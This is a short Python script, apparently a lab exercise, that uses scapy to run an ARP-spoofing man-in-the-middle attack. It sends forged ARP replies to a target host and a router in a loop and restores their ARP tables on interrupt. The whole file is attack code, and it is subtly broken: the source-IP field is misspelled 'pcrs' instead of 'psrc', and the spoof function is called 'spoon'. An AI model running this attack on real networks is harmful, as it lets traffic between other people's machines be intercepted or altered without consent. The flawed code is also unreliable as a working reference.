#!/usr/bin/env python3

import scapy.all as scapy

import time



def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast / arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]


    return answered_list[0][1].hwsrc



def restore(destination_ip, source_ip):

    destination_mac = get_mac(destination_ip)

    source_mac = get_mac(source_ip)

    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, pcrs=source_ip, hwsrc=source_mac)

    scapy.send(packet, verbose=False)



def spoon(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, pcrs=spoof_ip)

    scapy.send(packet, count=4, verbose=False)



target_ip = "10.0.2.15"

router_ip = "10.0.2.2"

sent_packets_count = 0

try:

    while True:

        spoon(target_ip, router_ip)

        spoon(router_ip, target_ip)

        sent_packets_count = sent_packets_count + 2

        print("\r[+] Packets sent : " + str(sent_packets_count), end="")

        time.sleep(2)

except KeyboardInterrupt:

    print("Program end, restoring ARP table...")

    restore(target_ip, router_ip)

    restore(router_ip, target_ip)